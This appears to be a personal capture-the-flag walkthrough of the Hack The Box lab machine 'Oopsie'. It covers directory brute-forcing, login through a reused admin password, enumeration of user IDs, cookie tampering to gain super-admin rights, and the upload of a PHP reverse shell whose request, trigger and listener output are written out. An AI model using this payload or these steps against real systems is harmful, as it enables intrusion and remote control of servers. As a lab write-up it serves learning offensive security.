# Oopsie (10.10.10.28) Apache
[[oopsie (10.10.10.28)]]
## Summary
### directories
| dir                                                  | notes                                    |
| ---------------------------------------------------- | ---------------------------------------- |
| /css                                                 | contains standard css files              |
| /js                                                  | contains prefixfree.min.js               |
| /fonts                                               | empty                                    |
| /images                                              | forbidden                                |
| /themes                                              | contains css files                       |
| /uploads                                             | must specify the name of a real file     | 
| /cdn-cgi/login/                                      | accessible login page and js script      |
| /cdn-cgi/scripts                                     | cloudflare files                         |
| /index.php                                           | accessible mainpage                      |
| /cdn-cgi/admin.php                                   | logged in user home                      |
| /cdn-cgi/login/admin.php?content=accounts&id=1       | Shows user info given id in url          |
| /cdn-cgi/login/admin.php?content=branding&brandId=10 | Shows brands on website                  |
| /cdn-cgi/login/admin.php?content=clients&orgId=1     | Shows clients on website                 |
| /cdn-cgi/login/admin.php?content=uploads             | Upload system restricted to super admins |

### website users
| username    | password         | role  | access id | id  | email                   |
| ----------- | ---------------- | ----- | --------- | --- | ----------------------- |
| admin       | MEGACORP_4dm1n!! | admin | 34322     | 1   | admin@megacorp.com      |
| john        |                  |       | 8832      | 4   | john@tafcz.co.uk        |
| Peter       |                  |       | 57633     | 13  | peter@qpic.co.uk        |
| Rafol       |                  |       | 28832     | 23  | tom@rafol.co.uk         |
| super admin |                  |       | 86575     | 30  | superadmin@megacrop.com |
|             |                  |       |           |     |                         |

### cookies
| name | default value                    | notes                                                                |
| ---- | -------------------------------- | -------------------------------------------------------------------- |
| role | admin                            | sepcifies user's role/permissions                                    |
| user | 34322 (current user's access id) | Can be modified to any value to inheret the permissions of that user | 
## Procedure
1. GoBuster on root directory with common dirs
	```
	tyler@ubuntu:~/Downloads$ gobuster dir -u http://10.10.10.28/ -w /opt/SecLists-2021.2/Discovery/Web-Content/common.txt
	===============================================================
	Gobuster v3.1.0
	by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
	===============================================================
	[+] Url:                     http://10.10.10.28/
	[+] Method:                  GET
	[+] Threads:                 10
	[+] Wordlist:                /opt/SecLists-2021.2/Discovery/Web-Content/common.txt
	[+] Negative Status codes:   404
	[+] User Agent:              gobuster/3.1.0
	[+] Timeout:                 10s
	===============================================================
	2021/08/17 09:06:20 Starting gobuster in directory enumeration mode
	===============================================================
	/.hta                 (Status: 403) [Size: 276]
	/.htpasswd            (Status: 403) [Size: 276]
	/.htaccess            (Status: 403) [Size: 276]
	/css                  (Status: 301) [Size: 308] [--> http://10.10.10.28/css/]
	/fonts                (Status: 301) [Size: 310] [--> http://10.10.10.28/fonts/]
	/images               (Status: 301) [Size: 311] [--> http://10.10.10.28/images/]
	/index.php            (Status: 200) [Size: 10932]
	/js                   (Status: 301) [Size: 307] [--> http://10.10.10.28/js/]
	/server-status        (Status: 403) [Size: 276]
	/themes               (Status: 301) [Size: 311] [--> http://10.10.10.28/themes/]
	/uploads              (Status: 301) [Size: 312] [--> http://10.10.10.28/uploads/]
	```
	![[Pasted image 20210817091248.png]]
2. Go Buster on /cdn-cgi directory with common dirs
	```
	tyler@ubuntu:~/Downloads$ gobuster dir -u http://10.10.10.28/cdn-cgi/ -w /opt/SecLists-2021.2/Discovery/Web-Content/common.txt

	===============================================================
	Gobuster v3.1.0
	by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
	===============================================================
	[+] Url:                     http://10.10.10.28/cdn-cgi/
	[+] Method:                  GET
	[+] Threads:                 10
	[+] Wordlist:                /opt/SecLists-2021.2/Discovery/Web-Content/common.txt
	[+] Negative Status codes:   404
	[+] User Agent:              gobuster/3.1.0
	[+] Timeout:                 10s
	===============================================================
	2021/08/17 09:08:35 Starting gobuster in directory enumeration mode
	===============================================================
	/.hta                 (Status: 403) [Size: 276]
	/.htpasswd            (Status: 403) [Size: 276]
	/.htaccess            (Status: 403) [Size: 276]
	/login                (Status: 301) [Size: 318] [--> http://10.10.10.28/cdn-cgi/login/]

	===============================================================
	2021/08/17 09:09:19 Finished
	===============================================================
	```
	![[Pasted image 20210817091351.png]]
	- http://10.10.10.28/cdn-cgi/login brings us to a login prompt
3. Logged in as admin with password re-use from [[archetype (10.10.10.27)]] administrator account
	```
	Request:
		POST /cdn-cgi/login/index.php HTTP/1.1
		Host: 10.10.10.28
		Content-Length: 44
		Cache-Control: max-age=0
		Upgrade-Insecure-Requests: 1
		Origin: http://10.10.10.28
		Content-Type: application/x-www-form-urlencoded
		User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
		Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
		Referer: http://10.10.10.28/cdn-cgi/login/index.php
		Accept-Encoding: gzip, deflate
		Accept-Language: en-US,en;q=0.9
		Cookie: role=admin; user=34322
		Connection: close

		username=admin&password=MEGACORP_4dm1n%21%21
	
	Response:
		HTTP/1.1 302 Found
		Date: Tue, 17 Aug 2021 16:43:32 GMT
		Server: Apache/2.4.29 (Ubuntu)
		Set-Cookie: user=34322; expires=Thu, 16-Sep-2021 16:43:32 GMT; Max-Age=2592000; path=/
		Set-Cookie: role=admin; expires=Thu, 16-Sep-2021 16:43:32 GMT; Max-Age=2592000; path=/
		Location: /cdn-cgi/login/admin.php
		Content-Length: 0
		Connection: close
		Content-Type: text/html; charset=UTF-8
	
	```
	![[Pasted image 20210817093541.png]]
	- user: `admin`
	- pass: `MEGACORP_4dm1n!!`
4. Discovered that the id at http://10.10.10.28/cdn-cgi/login/admin.php?content=accounts&id=1 can be changed to view other user info
	![[Pasted image 20210817095048.png]]
	- Found user john with id=4
		- user: `john`
		- access id: `8832`
		- id: `4`
		- email: `john@tafcz.co.uk`
5. Enumerated users by exploiting id php variable
	- Valid users seem to only be found when the response is > 3810
	- id=13
		- user: `Peter`
		- access id: `57633`
		- id: `13`
		- email: `peter@qpic.co.uk`
	- id=23
		- user: `Rafol`
		- access id: `28832`
		- id: `23`
		- email: `tom@rafol.co.uk`
	- id=30
		- user: `super admin`
		- access id: `86575`
		- id: `30`
		- email: `superadmin@megacorp.com`
6. Used EditThisCookie to inheret super user access from `super admin` user and access uploads site
	```
	GET /cdn-cgi/login/admin.php?content=uploads HTTP/1.1
	Host: 10.10.10.28
	Upgrade-Insecure-Requests: 1
	User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
	Referer: http://10.10.10.28/cdn-cgi/login/admin.php?content=accounts&id=1
	Accept-Encoding: gzip, deflate
	Accept-Language: en-US,en;q=0.9
	Cookie: role=admin; user=86575
	Connection: close
	```
	![[Pasted image 20210817101402.png]]
	- `super admin` user is indeed a super admin
	- user cookie can be manipulated to be any user's access id to inheret that users permissions
7. Successfully tested file upload of test file
	```
	tyler@ubuntu:~/Documents/learn/htb/htb-starting-point/oopsie$ curl http://10.10.10.28/uploads/twof_test.txt
	This is a test
	```
	![[Pasted image 20210817102402.png]]
8. Uploaded and connected to PHP reverse shell
	```
	Request:
		POST /cdn-cgi/login/admin.php?content=uploads&action=upload HTTP/1.1
		Host: 10.10.10.28
		Content-Length: 423
		Cache-Control: max-age=0
		Upgrade-Insecure-Requests: 1
		Origin: http://10.10.10.28
		Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryRkSwAhbdiPCzpeNX
		User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
		Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
		Referer: http://10.10.10.28/cdn-cgi/login/admin.php?content=uploads
		Accept-Encoding: gzip, deflate
		Accept-Language: en-US,en;q=0.9
		Cookie: role=admin; user=86575
		Connection: close

		------WebKitFormBoundaryRkSwAhbdiPCzpeNX
		Content-Disposition: form-data; name="name"


		------WebKitFormBoundaryRkSwAhbdiPCzpeNX
		Content-Disposition: form-data; name="fileToUpload"; filename="twof_reverse_shell.php"
		Content-Type: application/x-php

		<?php
			$sock=fsockopen("10.10.15.54",3602);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
		?>

		------WebKitFormBoundaryRkSwAhbdiPCzpeNX--
	
	Trigger:
		tyler@ubuntu:~/Documents/learn/htb/htb-starting-point/oopsie/scripts$ curl http://10.10.10.28/uploads/twof_reverse_shell.php
	
	Listener:
		tyler@ubuntu:~/Documents/learn/htb/htb-starting-point/oopsie$ ncat -nvlp 3602
		Ncat: Version 7.80 ( https://nmap.org/ncat )
		Ncat: Listening on :::3602
		Ncat: Listening on 0.0.0.0:3602
		Ncat: Connection from 10.10.10.28.
		Ncat: Connection from 10.10.10.28:46500.
		/bin/sh: 0: can't access tty; job control turned off
		$
	```
	![[Pasted image 20210817103952.png]]
	![[Pasted image 20210817104022.png]]
	- allows pivoting to sh shell
